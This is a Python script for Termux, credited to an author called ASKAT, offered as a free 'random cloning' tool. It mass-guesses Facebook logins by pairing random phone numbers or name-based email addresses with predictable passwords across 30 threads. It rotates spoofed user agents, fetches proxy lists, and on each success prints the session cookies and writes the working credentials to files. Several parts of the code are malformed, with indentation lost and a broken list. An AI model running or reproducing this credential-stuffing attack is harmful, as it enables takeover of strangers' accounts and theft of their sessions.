#Create By: ASKAT
#Facebook: ASKAT MRIDHA
#GitHub: https://github.com/askatxriddu
#---------------------------------------------------------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:    
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('pkg install espeak')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen3=[]
ugen4=[]
ugen=[]
askat=[]
askat=[]
cokbrut=[]
ses=requests.Session()
princp=[]

def clear():
os.system('clear')
def back():
login()

ah="-NOOB-"
imt="=ASKAT="
ak="_BR1S7Y_"
myid=uuid.uuid4().hex[:10].upper()
try:
key1 = open('/data/data/com.termux/files/usr/bin/.ASKAT -cov', 'r').read()
except:
kok=open('/data/data/com.termux/files/usr/bin/.ASKAT -cov', 'w')
kok.write(myid+imt)
kok.close()


try:
prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('.prox.txt','w').write(prox)
except Exception as e:
print('')
prox=open('.prox.txt','r').read().splitlines()

#sadiya','jannat','sumaiya','@@@###','i love you'
        
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 12; Motorola Moto G Stylus 5G Build/SP2A.540585.035; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 12; Motorola Moto G Stylus 5G Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5370.472'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FBAN/EMA;FBLC/th_TH;FBAV/264.0.0.41.18;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
    

ugen2=['Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36;]'

'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36;]'

'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36;]'

'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36;]'

'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36;]'

'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36;]'

'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36;]'


os.system('xdg-open https://github.com/askatxriddu')
os.system('espeak -a 300 "WELCOME TO ASKAT RANDOM CLONING TOOLS"')
logo = ("""
\033[1;32m    ╔═════════════════  𝘼𝘿𝙈𝙄𝙉 𝙄𝙉𝙁𝙊  ══════════════╗
\033[1;32m    ║     [🍁] CREATED BY   :  ASKAT MRIDHA      ║
\033[1;32m    ║     [🍁] FACEBOK      :  ASKATMRIDHA     ║
\033[1;32m    ║     [🍁] GITHUB       :  askatxriddu          ║
\033[1;32m    ║     [🍁] TOOL STATUS  :  𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒊𝒏𝒈      ║
\033[1;32m    ║     [🍁] TEAM         :  A T Z COMMUNITY     ║
\033[1;32m    ║     [🍁] TOOL VIRSION :  \033[1;91m01.6         \033[1;32m       ║
\033[1;32m    ║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱║
\033[1;32m    ║     [🍁] PLZ SAPPORT ME BRO....              ║
\033[1;32m    ║     [🍁] ASKAT TERMUX COMMEND ZONE....       ║
\033[1;32m    ╚═════════════════  𝑹𝑰𝑫𝑫𝑼  𝑵𝑶𝑶𝑩  ══════════════╝

\033[1;32m[\033[0;41;37m==========={ ASKAT MRIDHA TOOL'S 🔥\033[0;37;41m FREE }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
""")


    
        
        
class Bristy:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = [] 
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(f"\033[1;32m [01] Random Number Clone")
        print(f"\033[1;32m [02] Random Email Clone ")
        print(f"\033[1;32m [00] Exit")
        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        Askat =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/profile.php?id=100091256138777')
        os.system('espeak -a 250 "FOLLOW MY FACEBOOK ACCOUNT FOR NEXT UPDATES"')
        if Askat in ["1", "01"]:
            num()
        if Askat in ["2","02"]:
            gml()
        if Askat in [" 0", "00"]:
            exit()
        else:
            exit() 
    
def num():
    user=[]
    os.system('clear')
    os.system('espeak -a 300 "ENTER YOUR SIM CODE"')
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print('┃[🌺] EXAMPLE : 017, 018, 019, 016, 9196, 9178┃ ')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    os.system('espeak -a 300 "ENTER YOUR CRACK LIMIT"')
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print('┃[🌺]EXAMPLE : 3000, 5000, 10000, 50000┃')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        os.system('espeak -a 300 "YOUR CRACK HAS BEEN STARTED PLEASE WAIT"')
        print(logo)
        tl = str(len(user))
        ip = requests.get("https://api.ipify.org").text
        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(" [🌺]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
        print(" \033[1;97m[🌺] Crack Limit :\033[1;92m"+tl)
        print(' \033[1;97m[🌺] Crack has been started      ')
        print(' \033[1;97m[🍁] Wait for ok ids             ')
        print(' \033[1;97m[🍁] Use flight mode for speed up ')
        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(sexr,uid,pwx,tl)
    print(' [🍁] Crack has been completed')
    print(' [💥] Total ok ids : [\033[1;92m%s\033[1;97m]')
    print(' [🍁] Ids saved in ok.txt,cp.txt')
    os.system('espeak -a 300 "YOUR CRACK HAS BEEN Completed"')
    os.system('espeak -a 200 "PLACE SAND REVIEW ADMIN"')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100091256138777')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print(' [🌺] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    os.system('espeak -a 300 "ENTER YOUR CRACK LIMIT"')
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print('┃[🌺]EXAMPLE : 3000, 5000, 10000, 50000┃')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    limit = int(input('[?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        os.system('espeak -a 300 "YOUR CRACK HAS BEEN STARTED PLEASE WAIT"')
        print(logo)
        tl = str(len(user))
        ip = requests.get("https://api.ipify.org").text
        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(" [🌺]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
        print("\033[1;97m┃[🌺] Crack Limit :\033[1;92m"+tl)
        print('\033[1;97m┃[🌺] Crack has been started      ┃')
        print('\033[1;97m┃[🍁] Wait for ok ids             ┃')
        print('\033[1;97m┃[🍁] Use flight mode for speed up┃ ')
        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345','freefire','FreeFire','@freefire@']
            yaari.submit(sexr,uid,pwx,tl)
    print(' [🍁] Crack has been completed')
    print(' [💥] Total ok ids : [oks]')
    print(' [🍁] Ids saved in ok.txt,cp.txt')
    os.system('espeak -a 300 "YOUR CRACK HAS BEEN Completed"')
    os.system('espeak -a 200 "PLACE SAND REVIEW ADMIN"')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100091256138777')
    

def sexr(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mASKAT\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb =  {'authority': 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'authority': 'developer.facebook.com',
            'x-fb-rlafr': '0',
            'access-control-allow-origin': '*',
            'facebook-api-version': 'v17.0',
            'strict-transport-security': 'max-age=15552000',
            'pragma': 'no-cache',
            'cache-control': 'private, no-cache, no-store, must-revalidate',
            'x-fb-request-id': 'A5ZKh_85GaagpB8XJbwc9jD',
            'x-fb-trace-id': 'DKv719n6x5A',
            'x-fb-rev': '1007660106',
            'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(" ")
                print(f" {YELLOW} ═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═")
                print(f"\033[38;5;46m ┏━[CONGRATULATIONS FOR OK ID] ")
                print(f"\033[38;5;46m ┣━[Number] : {uid} ")
                print(f"\033[38;5;46m ┗━[Password] : {ps} ")
                os.system('espeak -a 300 "CONGRATULATIONS FOR OK I D"')
                print(" ")
                print(f"[🫀] [Cookie] : \033[1;35m{coki}")
                print(f" {YELLOW} ═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═")
                open('/sdcard/ASKAT-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                open('/sdcard/ASKAT-cp.txt', 'a').write( uid+' 💔 '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ASKAT™] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass